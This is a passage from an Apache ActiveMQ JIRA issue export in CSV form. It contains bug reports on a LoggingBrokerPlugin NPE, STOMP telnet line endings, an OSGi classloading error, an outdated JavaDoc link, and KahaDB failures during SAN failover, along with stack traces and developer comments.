		};
		node = new MessageReference() {
			
			@Override
			public boolean isPersistent() {return false; }
			
			@Override
			public boolean isExpired() { 
				return false; 
			}
			
			@Override
			public boolean isDropped() { return false; }
			
			@Override
			public boolean isAdvisory() { return false; }
			
			@Override
			public int incrementReferenceCount() { return 0; }
			
			@Override
			public void incrementRedeliveryCounter() { }
			
			@Override
			public ConsumerId getTargetConsumerId() { return null; }
			
			@Override
			public int getSize() { return 0; }
			
			@Override
			public Destination getRegionDestination() { return destination; }
			
			@Override
			public int getReferenceCount() { return 0; }
			
			@Override
			public int getRedeliveryCounter() { return 0; 	}
			
			@Override
			public MessageId getMessageId() { return messageId; }
			
			@Override
			public Message getMessageHardRef() { return null; }
			
			@Override
			public Message getMessage() { return message; }
			
			@Override
			public int getGroupSequence() { return 0; 	}
			
			@Override
			public String getGroupID() { return null; }
			
			@Override
			public long getExpiration() { return 0; }
			
			@Override
			public int decrementReferenceCount() { return 0; }
		};
	}
}
{code};;;","05/Mar/12 22:09;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Suspicious NPE in log when network bridge cannot be established and loggingBrokerPlugin configured,AMQ-3731,12543407,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,tabish,tabish,20/Feb/12 21:44,20/Feb/12 21:48,14/Jul/23 05:43,20/Feb/12 21:48,5.5.1,,,,,5.6.0,,,Connector,Transport,,,0,,,,,,,,,"WIth the following broker plugins enabled: 

{code}
<plugins>
<loggingBrokerPlugin logAll=""true"" logConnectionEvents=""false""/>
<traceBrokerPathPlugin/>
</plugins>
{code}

and network bridge down (only one broker up), the following error appears in the active broker log:

{noformat}
WARN  - DiscoveryNetworkConnector      - Could not start network bridge between: vm://broker1?async=false&network=true and: tcp://0.0.0.0:61627?soWriteTimeout=15000&soTimeout=15000&wireFormat.maxInactivityDuration=30000 due to: java.net.ConnectException: Connection refused
WARN  - DemandForwardingBridgeSupport  - Caught an exception processing local command
java.lang.NullPointerException
	at org.apache.activemq.broker.util.LoggingBrokerPlugin.removeBroker(LoggingBrokerPlugin.java:406)
	at org.apache.activemq.broker.MutableBrokerFilter.removeBroker(MutableBrokerFilter.java:195)
	at org.apache.activemq.broker.MutableBrokerFilter.removeBroker(MutableBrokerFilter.java:195)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java:339)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:718)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:130)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:159)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:991)
	at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:954)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
{noformat}

While this doesn't cause anything to break its not helpful to see these logs.  The issue is that the DemandForwardingBridgeSupport stop method always calls removeBroker on the remote even if it never connected and the remote broker info is null.  We should check this condition first before trying to remove something we never connected to.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228653,,,Mon Feb 20 21:48:28 UTC 2012,,,,,,,,,,,"0|i0ai5r:",59215,,,,,,,,,,,,,,,,,,,,,"20/Feb/12 21:48;tabish;Fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stomp wireformat and codec block on telnet CRLF CRLF header separator,AMQ-3729,12543352,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,20/Feb/12 14:45,20/Feb/12 15:00,14/Jul/23 05:43,20/Feb/12 14:59,5.6.0,,,,,5.6.0,,,STOMP,,,,0,stomp,telnet,,,,,,,changes 1.1 support and nio have broken telnet support for stomp. The telnet CRLF in place of LF is the root cause.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228598,,,Mon Feb 20 14:59:28 UTC 2012,,,,,,,,,,,"0|i0agpj:",58980,Regression,,,,,,,,,,,,,,,,,,,,"20/Feb/12 14:59;gtully;fix and test in http://svn.apache.org/viewvc?rev=1291299&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web-console: AjaxServlet not working in OSGi container,AMQ-3727,12543159,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,themel,themel,18/Feb/12 17:33,20/Sep/12 08:07,14/Jul/23 05:43,20/Sep/12 08:07,5.5.1,,,,,5.7.0,,,,,,,0,,,,,,,,,"Installing activemq-web-console as a bundle in a ServiceMix container 

osgi:install mvn:org/apache/activemq/activemq-web-console

registers the AjaxServlet under http://<baseurl>/activemqweb/ajax but trying to access it fails with a ClassNotFoundError:

java.lang.NoClassDefFoundError: org/eclipse/jetty/continuation/ContinuationSupport
	at org.apache.activemq.web.MessageListenerServlet.doMessages(MessageListenerServlet.java:304)[163:org.apache.activemq.activemq-web-console:5.5.1]
	at org.apache.activemq.web.MessageListenerServlet.doGet(MessageListenerServlet.java:241)[163:org.apache.activemq.activemq-web-console:5.5.1]
	at org.apache.activemq.web.AjaxServlet.doGet(AjaxServlet.java:47)[163:org.apache.activemq.activemq-web-console:5.5.1]
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:538)[97:org.eclipse.jetty.servlet:7.4.5.v20110725]
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1352)[97:org.eclipse.jetty.servlet:7.4.5.v20110725]
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)[163:org.apache.activemq.activemq-web-console:5.5.1]
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1323)[97:org.eclipse.jetty.servlet:7.4.5.v20110725]
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:476)[97:org.eclipse.jetty.servlet:7.4.5.v20110725]
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70)[111:org.ops4j.pax.web.pax-web-jetty:1.0.7]
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:480)[99:org.eclipse.jetty.security:7.4.5.v20110725]
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:937)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:116)[111:org.ops4j.pax.web.pax-web-jetty:1.0.7]
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:406)[97:org.eclipse.jetty.servlet:7.4.5.v20110725]
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:871)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:72)[111:org.ops4j.pax.web.pax-web-jetty:1.0.7]
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:110)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.Server.handle(Server.java:342)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:589)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1048)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:601)[100:org.eclipse.jetty.http:7.4.5.v20110725]
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:214)[100:org.eclipse.jetty.http:7.4.5.v20110725]
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:411)[96:org.eclipse.jetty.server:7.4.5.v20110725]
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:535)[98:org.eclipse.jetty.io:7.4.5.v20110725]
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:40)[98:org.eclipse.jetty.io:7.4.5.v20110725]
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:529)[108:org.eclipse.jetty.util:7.4.5.v20110725]
	at java.lang.Thread.run(Thread.java:662)[:1.6.0_23]
Caused by: java.lang.ClassNotFoundException: org.eclipse.jetty.continuation.ContinuationSupport not found by org.apache.activemq.activemq-web-console [163]
	at org.apache.felix.framework.ModuleImpl.findClassOrResourceByDelegation(ModuleImpl.java:787)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.felix.framework.ModuleImpl.access$400(ModuleImpl.java:71)[org.apache.felix.framework-3.0.9.jar:]
	at org.apache.felix.framework.ModuleImpl$ModuleClassLoader.loadClass(ModuleImpl.java:1768)[org.apache.felix.framework-3.0.9.jar:]
	at java.lang.ClassLoader.loadClass(ClassLoader.java:248)[:1.6.0_23

Adding ""org.eclipse.jetty.continuation;resolution:=optional"" to the Import-Package: statement in MANIFEST.MF/Import-Package element in pom.xml of activemq-web-console fixes it.

",Apache Karaf 2.2.4/ServiceMix 4.4.0,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228445,,,Thu Sep 20 08:07:35 UTC 2012,,,,,,,,,,,"0|i0ai5z:",59216,,,,,,,,,,,,,,,,,,,,,"19/Sep/12 12:43;davsclaus;Thanks for reporting and providing the solution.;;;","20/Sep/12 08:07;davsclaus;Thanks for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JavaDoc on main banner points ActiveMQ 5.5.0 JavaDocs and not 5.5.1,AMQ-3726,12543086,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jsherman1,jsherman1,17/Feb/12 19:53,01/Sep/12 16:13,14/Jul/23 05:43,01/Sep/12 16:13,5.5.1,,,,,5.6.0,,,Documentation,,,,0,,,,,,,,,"When using the link to the JavaDocs for ActiveMQ from the banner of the ActiveMQ site it points to the following URL:
http://activemq.apache.org/maven/5.5.0/activemq-core/apidocs/ and loads the ActiveMQ :: Core 5.5.0 API documentation.

Simply switching the version to 5.5.1 results in a 404 Not Found.  Can this be updated to 5.5.1 JavaDocs?",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228372,,,Sat Sep 01 16:13:07 UTC 2012,,,,,,,,,,,"0|i0ai67:",59217,,,,,,,,,,,,,,,,,,,,,"20/Feb/12 21:34;gtully;A redirection would make sense, b/c there were no code changes for 5.5.1;;;","20/Feb/12 21:47;jsherman1;Hi Gary,

It just is a little confusing when you are looking for 5.5.1 API and you see you are redirected to 5.5.0.  Even though the API has not changed it would be good to have the title on the page updated so users know the are looking at valid API doc for 5.5.1.;;;","01/Sep/12 16:13;davsclaus;Javadoc now updated to 5.6.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Kahadb error during SAN failover delayed write - Allow kahaDB to recover in a similar manner as the JDBC store using the IOExceptionHandler,AMQ-3725,12543079,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,jsherman1,jsherman1,17/Feb/12 18:57,13/Mar/17 13:41,14/Jul/23 05:43,03/Apr/14 00:32,5.5.1,,,,,5.10.0,5.9.1,,Message Store,,,,3,,,,,,,,,"An issue can arise that causes the broker to terminate when using kahaDB with a SAN, when the SAN fails over.  In this case the failover process is seamless however, on fail back there is a 2-3 sec delay where writes are blocked and the broker terminates.  With the JDBC datastore a similar situation can be handled by using the IOExceptionHandler.  However with kahaDB, when this same IOExceptionHandler is added it prevents the broker from terminating but kahaDB retains an invalid index.

{code}
 INFO | ActiveMQ JMS Message Broker (Broker1, ID:macbookpro-251a.home-56915-1328715089252-0:1) started
 INFO | jetty-7.1.6.v20100715
 INFO | ActiveMQ WebConsole initialized.
 INFO | Initializing Spring FrameworkServlet 'dispatcher'
 INFO | ActiveMQ Console at http://0.0.0.0:8161/admin
 INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo
 INFO | RESTful file access application at http://0.0.0.0:8161/fileserver
 INFO | FUSE Web Console at http://0.0.0.0:8161/console
 INFO | Started SelectChannelConnector@0.0.0.0:8161
ERROR | KahaDB failed to store to Journal
java.io.SyncFailedException: sync failed
	at java.io.FileDescriptor.sync(Native Method)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
 INFO | Ignoring IO exception, java.io.SyncFailedException: sync failed
java.io.SyncFailedException: sync failed
	at java.io.FileDescriptor.sync(Native Method)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
ERROR | Checkpoint failed
java.io.SyncFailedException: sync failed
	at java.io.FileDescriptor.sync(Native Method)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
 INFO | Ignoring IO exception, java.io.SyncFailedException: sync failed
java.io.SyncFailedException: sync failed
	at java.io.FileDescriptor.sync(Native Method)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
ERROR | KahaDB failed to store to Journal
java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
 INFO | Ignoring IO exception, java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
ERROR | KahaDB failed to store to Journal
java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
 INFO | Ignoring IO exception, java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)
	at java.io.RandomAccessFile.open(Native Method)
	at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216)
	at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70)
	at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324)
	at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)
 WARN | Transport failed: java.io.EOFException
 WARN | Transport failed: java.io.EOFException
 INFO | KahaDB: Recovering checkpoint thread after death
ERROR | Checkpoint failed
java.io.IOException: Input/output error
	at java.io.RandomAccessFile.write(Native Method)
	at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315)
 INFO | Ignoring IO exception, java.io.IOException: Input/output error
java.io.IOException: Input/output error
	at java.io.RandomAccessFile.write(Native Method)
	at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315)
 INFO | KahaDB: Recovering checkpoint thread after death
ERROR | Checkpoint failed
java.io.IOException: Input/output error
	at java.io.RandomAccessFile.write(Native Method)
	at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315)
 INFO | Ignoring IO exception, java.io.IOException: Input/output error
java.io.IOException: Input/output error
	at java.io.RandomAccessFile.write(Native Method)
	at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001)
	at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006)
	at org.apache.kahadb.page.PageFile.flush(PageFile.java:484)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290)
	at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:760)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766)
	at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315)
 WARN | Transport failed: java.io.EOFException
{code}",,absynthe49,artnaseef,davsclaus,dejanb,donnchadh,gtully,paulgale,sbrandt,sreepanchajanyam,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6625,,,,,,,,,,,,,"11/Oct/13 17:52;absynthe49;AMQ-3725-10112013.txt;https://issues.apache.org/jira/secure/attachment/12608043/AMQ-3725-10112013.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,228365,,,Sat Jun 07 21:18:22 UTC 2014,,,,,,,,,,,"0|i0alb3:",59725,,,,,,,,,,,,,,,,,,,,,"18/Feb/12 06:39;wangyin;Jason,we are going to set up master-slave brokers with SAN but get into the trouble of synchronization.
We mount SAN to the same path directory on two servers while operations such as creating or deleting files in the shared directory seems not synchronous. 
One server cannot see changes made by the other if not remounting manually.
I know that even NFS can work well but it's not recommended to be the shared storage with AMQ.
Can you share some experience about setting up the shared storage with SAN?
Thanks.;;;","28/Aug/12 08:38;sreepanchajanyam;We have implemented a GFS based solution with i/o fencing (also called disk fencing). I/O fencing is used to avoid this ""split brain"" scenario where both active and passive servers write to the disk.

""One server cannot see changes made by the other if not remounting manually."" . Could you please make this sentence more clear?;;;","14/Feb/13 08:39;absynthe49;We ran into a similar issue but we a missing some of the exceptions shown in the description. We are running 5.7.0

{noformat} 
KahaDB failed to store to Journal | org.apache.activemq.store.kahadb.MessageDatabase | ConcurrentQueueStoreAndDispatch
java.io.SyncFailedException: sync failed
        at java.io.FileDescriptor.sync(Native Method)
        at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:367)
        at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)
2013-02-13 17:07:57,427 | INFO  | Stopping the broker due to exception, java.io.SyncFailedException: sync failed | org.apache.activemq.util.DefaultIOExceptionHandler | ConcurrentQueueStoreAndDispatch
java.io.SyncFailedException: sync failed
        at java.io.FileDescriptor.sync(Native Method)
        at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:367)
        at org.apache.kahadb.journal.DataFileAppender$1.run(DataFileAppender.java:188)
2013-02-13 17:07:57,517 | INFO  | Apache ActiveMQ 5.7.0 (habroker, ID:HOSTNAME-35138-1360038011880-0:1) is shutting down | org.apache.activemq.broker.BrokerService | Stopping the broker due to IO exception

{noformat} 

After this, AMQ immediately went into shutdown mode. We did not see the FileNotFoundException, messages about checkpoint recovery with the IOException or the transport failures from EOFException. We did see the transport failures on the clients. The Java client also had an EOFException. Our C# client which is using NMS and gave the message ""Unable to read beyond the end of the stream"".

When we restarted AMQ, it would immediately shut down due to the journal files missing. We set the parameter on KahaDB in activemq.xml ignoreMissingJournalfiles=true. This time AMQ came up and said that it lost 33 messages.

We then saw a number of errors (they actually show up a number of times with maybe three variations almost like multiple loggers are kicking off):

{noformat}
2013-02-13 17:46:14,892 | ERROR | Problem retrieving message for browse | org.apache.activemq.broker.region.Queue | ActiveMQ Broker[habroker] Scheduler
java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Invalid location: 131:3886117, : java.lang.NegativeArraySizeException
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:113)
	at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
	at org.apache.activemq.broker.region.Queue.doBrowse(Queue.java:1066)
	at org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:832)
	at org.apache.activemq.broker.region.Queue.access$100(Queue.java:98)
	at org.apache.activemq.broker.region.Queue$2.run(Queue.java:138)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Timer.java:534)
	at java.util.TimerThread.run(Timer.java:484)
Caused by: java.lang.RuntimeException: java.io.IOException: Invalid location: 131:3886117, : java.lang.NegativeArraySizeException
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:277)
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
	... 8 more
Caused by: java.io.IOException: Invalid location: 131:3886117, : java.lang.NegativeArraySizeException
	at org.apache.kahadb.journal.DataFileAccessor.readRecord(DataFileAccessor.java:92)
	at org.apache.kahadb.journal.Journal.read(Journal.java:604)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:879)
	at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:1030)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$4.execute(KahaDBStore.java:558)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:547)
	at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:106)
	at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:274)
	... 9 more
{noformat}

This all happens during an 8 second period. Then... about 13 minutes later we see some more:

{noformat}
2013-02-13 17:59:55,562 | ERROR | Failed to page in more queue messages  | org.apache.activemq.broker.region.Queue | ActiveMQ BrokerService[habroker] Task-38
java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Invalid location: 125:11971180, : java.lang.NegativeArraySizeException
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:150)
	at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1766)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1993)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1486)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:679)
Caused by: java.lang.RuntimeException: java.io.IOException: Invalid location: 125:11971180, : java.lang.NegativeArraySizeException
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:277)
	at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:147)
	... 9 more
